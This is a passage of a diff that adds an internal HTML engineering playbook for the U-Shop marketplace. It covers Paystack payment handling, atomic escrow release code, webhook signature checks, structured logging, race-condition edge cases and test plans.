+    }),
+  ])
+
+  <span class="cm">// Schedule reminder sequence (BullMQ delayed jobs — survives server restarts)</span>
+  <span class="kw">await</span> <span class="fn">scheduleEscrowReminders</span>(<span class="var">order.id</span>, <span class="var">escrowReleaseAt</span>)
+  <span class="cm">// Notify seller</span>
+  <span class="kw">await</span> <span class="var">emailQueue.add</span>(<span class="str">'seller-new-order'</span>, { <span class="var">orderId</span>: <span class="var">order.id</span>, <span class="var">storeId</span>: <span class="var">order.storeId</span> })
+  <span class="var">logger.info</span>({ <span class="var">orderId</span>: <span class="var">order.id</span>, <span class="var">amount</span>: <span class="var">order.totalAmount</span> }, <span class="str">'Payment received — escrow created'</span>)
+}</code></pre>
+
+  <h3>Step 3 — Escrow Release (Buyer Confirmation or Auto-Release)</h3>
+
+  <pre><code><span class="cm">// apps/api/src/services/escrow.service.ts</span>
+<span class="cm">// This is the single code path for ALL escrow releases.</span>
+<span class="cm">// Whether buyer clicked "Confirm Delivery" or the 7-day cron fired,</span>
+<span class="cm">// they both call this function. This ensures rule consistency.</span>
+
+<span class="kw">export async function</span> <span class="fn">releaseEscrow</span>(
+  <span class="var">orderId</span>: <span class="type">string</span>,
+  <span class="var">trigger</span>: <span class="str">'BUYER_CONFIRMED'</span> | <span class="str">'AUTO_7DAY'</span> | <span class="str">'ADMIN_RELEASE'</span>,
+  <span class="var">actorId</span>?: <span class="type">string</span>  <span class="cm">// buyerId for BUYER_CONFIRMED, adminId for ADMIN_RELEASE</span>
+) {
+  <span class="cm">// R-04: Only the buyer of this specific order can trigger buyer-confirmation</span>
+  <span class="kw">if</span> (<span class="var">trigger</span> === <span class="str">'BUYER_CONFIRMED'</span>) {
+    <span class="kw">const</span> <span class="var">order</span> = <span class="kw">await</span> <span class="var">prisma.order.findUniqueOrThrow</span>({ <span class="var">where</span>: { <span class="var">id</span>: <span class="var">orderId</span> } })
+    <span class="kw">if</span> (<span class="var">order.buyerId</span> !== <span class="var">actorId</span>) <span class="kw">throw new</span> <span class="fn">ForbiddenError</span>(<span class="str">'Only the buyer can confirm delivery'</span>)
+    <span class="kw">if</span> (<span class="var">order.status</span> === <span class="str">'DISPUTED'</span>) <span class="kw">throw new</span> <span class="fn">BadRequestError</span>(<span class="str">'Cannot confirm while a dispute is open'</span>)
+  }
+
+  <span class="cm">// R-03: Atomic update — WHERE status = 'HELD' prevents double-release</span>
+  <span class="cm">// If two concurrent requests both try to release, only one will match this WHERE clause.</span>
+  <span class="cm">// The second will update 0 rows, which we detect and handle gracefully.</span>
+  <span class="kw">const</span> <span class="var">updateResult</span> = <span class="kw">await</span> <span class="var">prisma</span>.<span class="var">$transaction</span>(<span class="kw">async</span> (<span class="var">tx</span>) => {
+    <span class="cm">// Attempt to claim the escrow atomically</span>
+    <span class="kw">const</span> <span class="var">escrow</span> = <span class="kw">await</span> <span class="var">tx.escrow.updateMany</span>({
+      <span class="var">where</span>:  { <span class="var">orderId</span>, <span class="var">status</span>: <span class="str">'HELD'</span> },  <span class="cm">// R-03: only if currently HELD</span>
+      <span class="var">data</span>:   { <span class="var">status</span>: <span class="str">'RELEASED'</span>, <span class="var">releasedAt</span>: <span class="kw">new</span> <span class="fn">Date</span>(), <span class="var">releaseTrigger</span>: <span class="var">trigger</span> }
+    })
+    <span class="kw">if</span> (<span class="var">escrow.count</span> === <span class="num">0</span>) <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'ALREADY_RELEASED'</span>)  <span class="cm">// Will roll back tx</span>
+
+    <span class="kw">const</span> <span class="var">order</span> = <span class="kw">await</span> <span class="var">tx.order.findUniqueOrThrow</span>({
+      <span class="var">where</span>: { <span class="var">id</span>: <span class="var">orderId</span> }, <span class="var">include</span>: { <span class="var">store</span>: <span class="kw">true</span> }
+    })
+
+    <span class="cm">// R-08: Credit wallet in the same transaction as escrow status update</span>
+    <span class="kw">await</span> <span class="var">tx.wallet.update</span>({
+      <span class="var">where</span>: { <span class="var">userId</span>: <span class="var">order.store.ownerId</span> },
+      <span class="var">data</span>:  {
+        <span class="var">availableBalance</span>: { <span class="var">increment</span>: <span class="var">order.sellerAmount</span> },
+        <span class="var">totalEarned</span>:      { <span class="var">increment</span>: <span class="var">order.sellerAmount</span> },
+      }
+    })
+    <span class="kw">await</span> <span class="var">tx.walletTransaction.create</span>({ <span class="var">data</span>: {
+      <span class="var">walletId</span>:    (await <span class="var">tx.wallet.findFirst</span>({ <span class="var">where</span>: { <span class="var">userId</span>: <span class="var">order.store.ownerId</span> } }))!.<span class="var">id</span>,
+      <span class="var">amount</span>:      <span class="var">order.sellerAmount</span>,
+      <span class="var">description</span>: `Sale: Order #${<span class="var">order.id</span>.slice</span>(-<span class="num">8</span>)}`,
+      <span class="var">orderId</span>,
+    }})
+    <span class="kw">await</span> <span class="var">tx.order.update</span>({
+      <span class="var">where</span>: { <span class="var">id</span>: <span class="var">orderId</span> },
+      <span class="var">data</span>:  { <span class="var">status</span>: <span class="str">'COMPLETED'</span>, <span class="var">completedAt</span>: <span class="kw">new</span> <span class="fn">Date</span>() }
+    })
+    <span class="kw">return</span> <span class="var">order</span>
+  })
+
+  <span class="cm">// Post-release: prompt buyer to leave a review</span>
+  <span class="kw">await</span> <span class="var">emailQueue.add</span>(<span class="str">'buyer-leave-review'</span>, { <span class="var">orderId</span>, <span class="var">delay</span>: <span class="num">3600000</span> })  <span class="cm">// 1 hour delay</span>
+  <span class="var">logger.info</span>({ <span class="var">orderId</span>, <span class="var">trigger</span>, <span class="var">actorId</span> }, <span class="str">'Escrow released — seller wallet credited'</span>)
+}</code></pre>
+
+  <!-- PILLAR 2 -->
+  <div class="pillar" id="m4-perf"><span class="pillar-badge pb-perf">Pillar 2</span><h2>Performance & Optimization</h2></div>
+
+  <ul class="ul">
+    <li><strong>The webhook endpoint must respond within 20 seconds.</strong> Paystack retries after 20 seconds without a response. To guarantee this: (1) verify the HMAC signature (<1ms), (2) save the raw event to <code>webhook_events</code> (<5ms typically), (3) send the 200 response immediately, (4) process the event asynchronously after the response has been sent. Never make the financial processing block the HTTP response.</li>
+    <li><strong>Escrow auto-release cron is idempotent by design.</strong> The auto-release job runs every minute and calls <code>releaseEscrow()</code> for all orders where <code>escrowReleaseAt &lt;= NOW() AND status = 'PAYMENT_RECEIVED'</code>. The R-03 atomic WHERE guard (<code>WHERE status = 'HELD'</code>) means even if the cron fires twice within the same minute due to a scheduling bug, only one release succeeds. The second is silently ignored via the ALREADY_RELEASED error path.</li>
+    <li><strong>Paystack Transfer API is called outside the database transaction.</strong> Initiating a Paystack payout transfer is an external API call — you cannot roll it back with a Prisma transaction. Always: (1) debit the wallet inside a DB transaction, (2) call Paystack Transfer AFTER the transaction commits, (3) if the Transfer call fails, immediately re-credit the wallet and mark the Payout FAILED. Never call Paystack inside a Prisma <code>$transaction()</code> block.</li>
+    <li><strong>Checkout page uses client-side redirect, not server redirect.</strong> After initiating the order, Express returns the Paystack <code>authorization_url</code>. The frontend does <code>window.location.href = authorizationUrl</code>. A server-side <code>redirect()</code> would lose the order ID from the Next.js context. Using client-side navigation preserves the ability to show a loading state and handle errors.</li>
+  </ul>
+
+  <!-- PILLAR 3 -->
+  <div class="pillar" id="m4-sec"><span class="pillar-badge pb-sec">Pillar 3</span><h2>Security & Error Handling</h2></div>
+
+  <div class="callout callout-red">
+    <strong>Webhook HMAC Verification — The First Line of Defense</strong>
+    <p>Without signature verification, anyone who knows your webhook URL can POST fake payment success events and trigger fake escrow releases. The verification code is: <code>crypto.createHmac('sha512', PAYSTACK_SECRET_KEY).update(rawBody).digest('hex')</code> and compare to the <code>x-paystack-signature</code> header. This MUST run before any business logic. If signatures don't match, return 401 immediately and log a WARN — this is a potential attack. The webhook route MUST use <code>express.raw()</code> — once <code>express.json()</code> parses the body, the raw bytes are gone and HMAC verification will always fail.</p>
+  </div>
+
+  <ul class="ul">
+    <li><strong>R-11 — Block seller withdrawals during open disputes.</strong> Before initiating a payout, check <code>prisma.dispute.count({ where: { order: { storeId: store.id }, status: { in: ['OPEN', 'UNDER_REVIEW'] } } })</code>. If count > 0, reject the payout with "You cannot withdraw while a dispute is open for one of your orders." This prevents the fraud scenario where a seller receives a legitimate chargeback request, withdraws all their wallet balance, and has no funds to cover a valid refund.</li>
+    <li><strong>R-13 — Platform fee is never refunded.</strong> When a full refund is issued (on admin decision or buyer dispute win), the refund amount is <code>escrow.heldAmount</code> — the seller's cut only. The <code>platformFee</code> portion stays with the platform. This must be enforced in the refund service, never computed on the fly. The order record has both values — always use the pre-computed <code>sellerAmount</code> for refund calculation.</li>
+    <li><strong>Paystack amount in pesewas — type safety.</strong> Paystack accepts amounts in the smallest denomination (pesewas for GHS). Your <code>toPesewas()</code> function must use Decimal arithmetic: <code>amount.mul(100).toInteger()</code>. Never use <code>Math.round(parseFloat(amount) * 100)</code> — floating-point rounding errors in pesewa conversion will cause Paystack to reject transactions or, worse, charge slightly wrong amounts that compound over thousands of transactions.</li>
+    <li><strong>Payout to wrong recipient code.</strong> Before calling the Transfer API, verify that the <code>paystackRecipientCode</code> on the user record is still valid by calling Paystack's <code>GET /transferrecipient/{recipient_code}</code> endpoint. A deleted or disabled recipient code will cause the transfer to fail silently (no webhook, no error response). This verification adds one API call but prevents stranded payouts.</li>
+  </ul>
+
+  <!-- PILLAR 4 -->
+  <div class="pillar" id="m4-log"><span class="pillar-badge pb-log">Pillar 4</span><h2>Logging & Observability</h2></div>
+  <p>The escrow system's logs are a financial audit trail. Every entry must include enough context to reconstruct the full transaction history without querying the database. The log format follows the correlation pattern: every log line contains the <code>orderId</code> so you can filter all log events for a single order across any time range.</p>
+
+  <div class="log-grid">
+    <div class="log-card log-info">
+      <h4>INFO — Structured Fields</h4>
+      <ul>
+        <li>order_initiated: orderId, storeId, buyerId, totalAmount, feeRate, paystackRef</li>
+        <li>payment_received: orderId, paystackRef, paidAt, escrowReleaseAt, trigger=webhook</li>
+        <li>escrow_released: orderId, releaseTrigger, sellerAmount, sellerId</li>
+        <li>payout_initiated: payoutId, userId, amount, recipientCode-last4, method</li>
+        <li>payout_completed: payoutId, transferCode, userId, amount, durationMs</li>
+      </ul>
+    </div>
+    <div class="log-card log-warn">
+      <h4>WARN</h4>
+      <ul>
+        <li>webhook_duplicate: eventId, orderId — already processed</li>
+        <li>webhook_slow_response: durationMs &gt; 5000, eventType</li>
+        <li>escrow_already_released: orderId, trigger — concurrent release attempt</li>
+        <li>payout_blocked_open_dispute: userId, disputeCount, walletId</li>
+        <li>paystack_api_slow: endpoint, durationMs &gt; 3000</li>
+      </ul>
+    </div>
+    <div class="log-card log-fatal">
+      <h4>FATAL</h4>
+      <ul>
+        <li>webhook_signature_invalid: ip, eventType — possible attack</li>
+        <li>escrow_wallet_credit_failed: orderId, error — money not credited, urgent</li>
+        <li>payout_transfer_failed_no_reversal: payoutId, userId, amount — wallet debit not reversed</li>
+        <li>charge_success_no_matching_order: paystackRef — buyer paid but no order found</li>
+        <li>reconciliation_paystack_api_error: orderId, paystackRef, error</li>
+      </ul>
+    </div>
+  </div>
+
+  <pre><code><span class="cm">// Structured log example — trace a payout failure without exposing sensitive data</span>
+<span class="var">logger.fatal</span>({
+  <span class="var">event</span>:       <span class="str">'payout_transfer_failed_no_reversal'</span>,
+  <span class="var">payoutId</span>:    <span class="var">payout.id</span>,         <span class="cm">// Internal ID — safe to log</span>
+  <span class="var">userId</span>:      <span class="var">payout.wallet.userId</span>,
+  <span class="var">amount</span>:      <span class="var">payout.amount</span>.<span class="fn">toString</span>(),
+  <span class="var">method</span>:      <span class="var">payout.recipientType</span>,
+  <span class="cm">// NO: full bank account number or MoMo number — log last 4 digits only</span>
+  <span class="var">recipientLast4</span>: <span class="var">getAccountLast4</span>(<span class="var">payout.recipientDetails</span>),
+  <span class="var">transferCode</span>: <span class="var">payout.paystackTransferCode</span>,
+  <span class="var">error</span>:        <span class="fn">sanitizeError</span>(<span class="var">err</span>),  <span class="cm">// Strip any PII from error messages</span>
+  <span class="var">timestamp</span>:    <span class="kw">new</span> <span class="fn">Date</span>().<span class="fn">toISOString</span>(),
+  <span class="var">alert</span>:        <span class="str">'REQUIRES_MANUAL_INTERVENTION'</span>,
+}, <span class="str">'Payout transfer failed — wallet debit may not have been reversed'</span>)</code></pre>
+
+  <!-- PILLAR 5 -->
+  <div class="pillar" id="m4-edge"><span class="pillar-badge pb-edge">Pillar 5</span><h2>Edge Cases & Missed Scenarios</h2></div>
+
+  <div class="edge-grid">
+    <div class="edge-card">
+      <h4>Two buyers purchase the last unit simultaneously</h4>
+      <div class="edge-problem">Item has <code>stock = 1</code>. Buyer A and Buyer B both initiate checkout at the exact same millisecond. Both see stock = 1 available. Both create orders. Both redirect to Paystack. Both pay. Now you have two completed payments for one item.</div>
+      <div class="edge-fix">The <code>prisma.listing.update({ where: { id, stock: { gte: quantity } }, data: { stock: { decrement: quantity } } })</code> in the Prisma transaction is the race condition guard. PostgreSQL's row-level locking ensures only one transaction can acquire the row lock at a time. The second transaction's UPDATE matches 0 rows (stock is already 0), the Prisma transaction throws, the order is NOT created, and the second buyer never gets a Paystack URL. They see: "Sorry, this item just sold out."</div>
+    </div>
+    <div class="edge-card">
+      <h4>Network drop after Paystack redirect, before buyer pays</h4>
+      <div class="edge-problem">Buyer clicks "Buy", order is created (status: PENDING_PAYMENT), stock is decremented. Browser redirects to Paystack. Buyer's internet dies. They never pay. The order sits in PENDING_PAYMENT forever, and the stock is locked.</div>
+      <div class="edge-fix">The reconciliation cron (runs every 5 minutes) finds orders in PENDING_PAYMENT for > 10 minutes. It calls Paystack's <code>GET /transaction/verify/{reference}</code>. If status is <code>abandoned</code>, it cancels the order, re-increments the stock (<code>listing.stock: { increment: quantity }</code>), and notifies the buyer that their session expired. Include a Paystack <code>reference</code> expiry concept — transactions older than 60 minutes with no payment are treated as abandoned.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Seller changes payout method mid-payout</h4>
+      <div class="edge-problem">A seller updates their MTN MoMo number (creating a new Paystack recipient) while a payout is in the PENDING state using the old recipient code. The old recipient code may be deleted.</div>
+      <div class="edge-fix">The Payout record stores a snapshot of the <code>recipientCode</code> and <code>recipientDetails</code> at the time the payout was initiated. A seller updating their payout method creates a new Paystack recipient but does NOT invalidate in-flight payouts using the old one. The new recipient is only used for future payout requests. Paystack recipient deletion is blocked (via the Paystack dashboard settings) while a payout using it is PENDING.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Paystack webhook fires twice for the same charge</h4>
+      <div class="edge-problem">Your server responds slowly (>5s) to the first webhook delivery. Paystack retries, sending the same <code>charge.success</code> event again. Without protection, you'd create two Escrow records and credit the seller's wallet twice.</div>
+      <div class="edge-fix">The idempotency check: <code>if (order.status !== 'PENDING_PAYMENT') return</code> in <code>handleChargeSuccess</code>. The first webhook sets status to <code>PAYMENT_RECEIVED</code>. The second webhook finds <code>status !== 'PENDING_PAYMENT'</code> and returns early — no double processing. This guard must precede all DB writes. Additionally, the <code>webhook_events</code> table has a unique constraint on <code>externalId</code> — a duplicate event upsert is a no-op.</div>
+    </div>
+  </div>
+
+  <!-- PILLAR 6 -->
+  <div class="pillar" id="m4-test"><span class="pillar-badge pb-test">Pillar 6</span><h2>Testing & Deployment Readiness</h2></div>
+
+  <div class="callout callout-amber">
+    <strong>Pre-Deploy Production Checklist — Payments Module</strong>
+    <p>Before deploying the payments module to production: (1) Run an end-to-end transaction in Paystack test mode from a real device — not just a unit test. (2) Verify that the webhook endpoint in your Paystack dashboard points to your production URL, not localhost. (3) Confirm the webhook secret in your environment variables matches the one in your Paystack dashboard exactly. (4) Test auto-release by setting <code>escrowReleaseAt</code> to 2 minutes in the future in a test environment and verifying the cron fires correctly. (5) Test <code>transfer.failed</code> webhook by creating a recipient with an invalid account number in test mode.</p>
+  </div>
+
+  <div class="test-grid">
+    <div class="test-card">
+      <h4>Unit Tests (Vitest)</h4>
+      <ul>
+        <li>HMAC signature verification: valid signature passes, tampered body fails</li>
+        <li><code>toPesewas(new Decimal('12.50'))</code> returns exactly 1250 (not 1249 or 1251)</li>
+        <li><code>handleChargeSuccess()</code> is idempotent — second call on PAYMENT_RECEIVED order is no-op</li>
+        <li><code>releaseEscrow()</code> ALREADY_RELEASED path throws when escrow status != HELD</li>
+        <li>R-04: releaseEscrow with wrong actorId throws ForbiddenError</li>
+        <li>R-11: payout blocked when open dispute exists for store</li>
+        <li>R-13: refund amount == sellerAmount (not totalAmount)</li>
+        <li>Stock race guard: second update returns count=0 when stock=0</li>
+      </ul>
+    </div>
+    <div class="test-card">
+      <h4>E2E Tests (Playwright + Paystack Test Mode)</h4>
+      <ul>
+        <li>Full checkout: listing → order initiation → Paystack test card → charge.success webhook → order PAYMENT_RECEIVED</li>
+        <li>Buyer confirms delivery → escrow released → seller wallet credited → seller can request payout</li>
+        <li>Payout request → transfer.success webhook → payout COMPLETED → seller notified</li>
+        <li>transfer.failed webhook → wallet re-credited → seller notified with error reason</li>
+        <li>Buyer callback URL accessed without paying → order stays PENDING → no escrow created</li>
+        <li>Duplicate webhook delivery → idempotency prevents double wallet credit</li>
+        <li>Reconciliation cron: abandoned order after 10 min → stock restored → buyer notified</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- END -->
+<div style="font-family:'IBM Plex Mono',monospace;font-size:9px;color:rgba(255,255,255,0.1);letter-spacing:0.12em;text-transform:uppercase;display:flex;align-items:center;gap:12px;margin:64px 0 0;">
+  <span style="flex:1;height:1px;background:rgba(255,255,255,0.05);display:block;"></span>
+  End of Playbook · U-Shop Feature Implementation Playbook v1.0 · Principal Engineer · Internal
+  <span style="flex:1;height:1px;background:rgba(255,255,255,0.05);display:block;"></span>
+</div>
+
+</div><!-- .body -->
+
+<div class="footer">
+  <div class="ft-logo"><div class="ft-u">U</div><div class="ft-sh">shop</div></div>
+  <div class="ft-r">Feature Implementation Playbook v1.0 · MVP Edition · Next.js 14 + Express + Supabase + Paystack · Internal</div>
+</div>
+</div><!-- .main -->
+</body>
+</html>
